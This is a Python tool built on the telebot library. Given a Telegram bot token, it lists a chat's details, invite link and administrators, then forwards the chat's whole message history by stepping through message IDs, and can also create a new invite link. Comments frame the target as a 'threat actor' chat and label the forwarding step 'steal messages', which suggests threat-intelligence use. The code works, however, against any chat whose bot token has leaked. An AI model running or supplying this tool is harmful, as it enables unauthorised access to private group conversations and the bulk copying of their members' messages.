import time
import json
import telebot

# ==============================
# CONFIG – EDIT THESE CONSTANTS
# ==============================
BOT_TOKEN = "BOT_TOKEN_HERE"

# Chat to forward FROM (threat actor / source)
SOURCE_CHAT_ID = -1000000000  # can also be "@channelusername"

# Chat to forward TO (your log group / destination)
DEST_CHAT_ID = -000000000       # can also be "@channelusername"

# Default limits
DEFAULT_START_MSG_ID = 1
DEFAULT_MAX_MSG_ID = 15_000_000
DEFAULT_DELAY_SEC = 0.4          # seconds between forwards
DEFAULT_FAST_MODE = False        # fast mode = step 15 instead of 1
# ==============================


def object_to_dict(obj):
    """Recursively convert TeleBot objects to plain dicts/lists/primitives."""
    if isinstance(obj, dict):
        return {k: object_to_dict(v) for k, v in obj.items()}
    elif hasattr(obj, "__dict__"):
        return {k: object_to_dict(v) for k, v in obj.__dict__.items()}
    elif isinstance(obj, list):
        return [object_to_dict(item) for item in obj]
    else:
        return obj


def ask_int(prompt, default=None):
    while True:
        suffix = f" [default: {default}]" if default is not None else ""
        val = input(f"{prompt}{suffix}: ").strip()
        if not val and default is not None:
            return default
        try:
            return int(val)
        except ValueError:
            print("Please enter a valid integer.")


def ask_float(prompt, default=None):
    while True:
        suffix = f" [default: {default}]" if default is not None else ""
        val = input(f"{prompt}{suffix}: ").strip()
        if not val and default is not None:
            return float(default)
        try:
            return float(val)
        except ValueError:
            print("Please enter a valid number.")


def ask_bool(prompt, default=False):
    default_str = "y" if default else "n"
    while True:
        val = input(f"{prompt} [y/n, default: {default_str}]: ").strip().lower()
        if not val:
            return default
        if val in ("y", "yes"):
            return True
        if val in ("n", "no"):
            return False
        print("Please answer y or n.")


def print_parsed_summary(bot_obj, chat_obj, admins_list):
    print("\n=== Parsed summary ===")

    # --- Bot info ---
    if bot_obj is not None:
        bot_name = " ".join(
            [x for x in [bot_obj.first_name, bot_obj.last_name] if x]
        ) or bot_obj.username or "(no name)"
        bot_username = f"@{bot_obj.username}" if bot_obj.username else "(no username)"
        print(f"Bot:")
        print(f"  - Name:      {bot_name}")
        print(f"  - Username:  {bot_username}")
        print(f"  - ID:        {bot_obj.id}")
        print(f"  - Is bot:    {bot_obj.is_bot}")
    else:
        print("Bot: (no data)")

    # --- Chat / group info ---
    if chat_obj is not None:
        title = getattr(chat_obj, "title", None) or "(no title)"
        chat_type = getattr(chat_obj, "type", None) or "(no type)"
        invite_link = getattr(chat_obj, "invite_link", None) or "(no invite link)"
        print("\nSource chat:")
        print(f"  - Title:       {title}")
        print(f"  - ID:          {chat_obj.id}")
        print(f"  - Type:        {chat_type}")
        print(f"  - Invite link: {invite_link}")
    else:
        print("\nSource chat: (no data)")

    # --- Admins ---
    if admins_list:
        print("\nAdmins:")
        for a in admins_list:
            try:
                u = a.user
                name = " ".join(
                    [x for x in [u.first_name, u.last_name] if x]
                ) or u.username or "(no name)"
                username = f"@{u.username}" if u.username else "(no username)"
                status = getattr(a, "status", "(no status)")
                is_bot = u.is_bot
                print(f"  - {name} ({username})")
                print(f"      ID:      {u.id}")
                print(f"      Status:  {status}")
                print(f"      Is bot:  {is_bot}")
            except Exception:
                # Fallback in case structure is weird
                print(f"  - {a}")
    else:
        print("\nAdmins: (no data)")

    print("")  # trailing newline


def forward_messages(tb, start_msg_id, max_msg_id, fast_mode, delay_sec):
    step = 15 if fast_mode else 1
    print(f"[*] Fast mode: {'ON (step=15)' if fast_mode else 'OFF (step=1)'}")
    print(f"[*] Forwarding {SOURCE_CHAT_ID} -> {DEST_CHAT_ID}")
    print(f"[*] Range: {start_msg_id} .. {max_msg_id} (step={step})")
    print(f"[*] Delay between messages: {delay_sec} seconds\n")

    errors_in_row = 0

    for msg_id in range(start_msg_id, max_msg_id + 1, step):
        try:
            tb.forward_message(
                chat_id=DEST_CHAT_ID,
                from_chat_id=SOURCE_CHAT_ID,
                message_id=msg_id
            )
            print(f"[+] Forwarded message {msg_id}")
            errors_in_row = 0
        except telebot.apihelper.ApiException as e:
            errors_in_row += 1
            print(f"[-] Message {msg_id} failed: {e}")

            # If we keep failing, we probably passed the last valid message
            if errors_in_row >= 2000:
                print("[!] 2000 consecutive errors – stopping (likely reached end).")
                break

            time.sleep(delay_sec)
            continue

        # Rate limiting / sleep logic
        time.sleep(delay_sec)
        if msg_id % 300 == 0:
            print("[*] Processed 300 messages, sleeping for 60 seconds...")
            time.sleep(60)


def main():
    print("=== Telegram Chat Helper ===")
    print(f"Bot token set: {'YES' if BOT_TOKEN else 'NO'}")
    print(f"Source chat:      {SOURCE_CHAT_ID}")
    print(f"Destination chat: {DEST_CHAT_ID}")
    print()

    if not BOT_TOKEN:
        print("[-] BOT_TOKEN is empty. Set it at the top of the script and rerun.")
        return

    tb = telebot.TeleBot(BOT_TOKEN)

    bot_obj = None
    chat_obj = None
    admins_list = None

    # === Info / Recon ===
    if ask_bool("Show get_me / get_chat / get_chat_administrators info?", default=True):
        # get_me
        try:
            bot_obj = tb.get_me()
            user_dict = bot_obj.__dict__
            pretty_user_json = json.dumps(user_dict, indent=4, ensure_ascii=False)
            print("\n=== get_me ===")
            print(pretty_user_json)
        except Exception as e:
            print(f"[!] get_me failed: {e}")

        # get_chat for source chat
        try:
            chat_obj = tb.get_chat(SOURCE_CHAT_ID)
            chat_dict = object_to_dict(chat_obj)
            pretty_chat_json = json.dumps(chat_dict, indent=4, ensure_ascii=False)
            print("\n=== get_chat (source) ===")
            print(pretty_chat_json)
        except Exception as e:
            print(f"[!] get_chat failed for {SOURCE_CHAT_ID}: {e}")

        # get_chat_administrators for source chat
        try:
            admins_list = tb.get_chat_administrators(SOURCE_CHAT_ID)
            admins_dict = object_to_dict(admins_list)
            pretty_admins_json = json.dumps(admins_dict, indent=4, ensure_ascii=False)
            print("\n=== get_chat_administrators (source) ===")
            print(pretty_admins_json)
        except Exception as e:
            print(f"[!] Cannot get chat administrators: {e}")

        # Parsed / important fields
        print_parsed_summary(bot_obj, chat_obj, admins_list)

    # === Forward / steal messages ===
    if ask_bool("Forward messages from source chat to destination chat?", default=True):
        start_msg_id = ask_int("Start from message ID", default=DEFAULT_START_MSG_ID)
        max_msg_id = ask_int("Max message ID to try", default=DEFAULT_MAX_MSG_ID)
        fast_mode = ask_bool("Enable fast mode (skip with step=15)?", default=DEFAULT_FAST_MODE)
        delay_sec = ask_float("Delay between messages (in seconds)", default=DEFAULT_DELAY_SEC)

        forward_messages(
            tb=tb,
            start_msg_id=start_msg_id,
            max_msg_id=max_msg_id,
            fast_mode=fast_mode,
            delay_sec=delay_sec,
        )

    # === Optional: create invite link ===
    if ask_bool("Create and print an invite link for the SOURCE chat (if allowed)?", default=False):
        try:
            invite = tb.create_chat_invite_link(SOURCE_CHAT_ID)
            print("\n=== Invite link from API ===")
            print(invite)
        except Exception as e:
            print(f"[!] Failed to create invite link: {e}")

    print("\nDone.")


if __name__ == "__main__":
    main()
